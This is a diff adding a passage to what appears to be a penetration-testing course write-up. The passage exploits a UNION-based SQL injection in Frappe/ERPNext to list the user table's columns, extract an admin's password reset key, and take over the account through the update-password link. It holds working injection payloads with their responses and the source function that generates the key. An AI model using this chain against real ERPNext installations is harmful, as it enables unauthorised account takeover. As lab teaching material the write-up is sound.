@@ -190,3 +190,57 @@ This returns the response:
 ```json
 {"message":[{"route":"Administrator","content":"3","relevance":0,"name":"2","title":"4","doctype":"1"},{"route":"zeljka.k@randomdomain.com","content":"3","relevance":0,"name":"2","title":"4","doctype":"1"}]}
 ```
+Based on the response, the email we used to create the admin user was discovered. This is the account that we will target for the password reset. We can enter the email in the **`Forgot Password`** field.
+Selecting **`Send Password`** will create the password reset token for the user and send an email about the password reset.
+
+To identify the column storing the password reset key in the `tabUser` table, we use the following SQL injection payload adapted for a UNION-based attack:
+```sql
+SELECT COLUMN_NAME 
+FROM information_schema.columns 
+WHERE TABLE_NAME = "tabUser";
+```
+Sending that SQL injection payload returns the JSON:
+```json
+{"message":[{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"name"},...,{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"birth_date"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"reset_password_key"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"email"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"_comments"},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"1","route":"allowed_in_mentions"}]}
+```
+From the list of columns, we notice reset_password_key. We can use this column name to extract the password reset key. We should also include the name column to ensure that we are obtaining the reset key for the correct user. The query for this is: 
+```sql
+SELECT name COLLATE utf8mb4_general_ci, reset_password_key COLLATE utf8mb4_general_ci
+FROM tabUser;
+```
+The SQL query in Listing 49 needs to conform to the UNION query. This time, we will use the number "1" for the name/email and number "5" for the reset_password_key. The updated query:
+```sql
+SELECT `doctype`, `name`, `content`, `title`, `route`
+  FROM `__global_search`
+  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#%" AND MATCH(`content`) AGAINST (\'\\"offsec\\"\' IN BOOLEAN MODE)
+  LIMIT 20 OFFSET 0'
+```
+The Burp response contains the `password_reset_key` in the `"route"` string with the email in the `"doctype"` string.
+```json
+{"message":[{"name":"2","content":"3","relevance":0,"title":"4","doctype":"Administrator","route":null},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"Guest","route":null},{"name":"2","content":"3","relevance":0,"title":"4","doctype":"zeljka.k@randomdomain.com","route":"aAJTVmS14sCpKxrRT8N7ywbnYXRcVEN0"}]}
+```
+Now that we have the `password_reset_key`, let's figure out how to use it to reset the password. We will search the application's source code for `"reset_password_key"` with the idea that wherever this column is used, it will most likely give us a hint on how to use the key.
+Searching for `"reset_password_key"` allows us to discover the `reset_password` function in the file `apps/frappe/frappe/core/doctype/user/user.py`. The function can be found below.
+```python
+	def reset_password(self, send_email=False, password_expired=False):
+		from frappe.utils import random_string, get_url
+
+		key = random_string(32)
+		self.db_set("reset_password_key", key)
+
+		url = "/update-password?key=" + key
+		if password_expired:
+			url = "/update-password?key=" + key + '&password_expired=true'
+
+		link = get_url(url)
+		if send_email:
+			self.password_reset_mail(link)
+
+		return link
+```
+The `reset_password` function is used to generate the `reset_password_key`. Once the random key is generated, a link is created and emailed to the user. We can use the format of this link to attempt a password reset. The link we will visit in our example is:
+```
+http://erpnext:8000/update-password?key=aAJTVmS14sCpKxrRT8N7ywbnYXRcVEN0
+```
+If we type in a new password, we should receive a `"Password Updated"` message!
+We should now be able to log in as the administrator user (`zeljka.k@randomdomain.com`) using our new password.
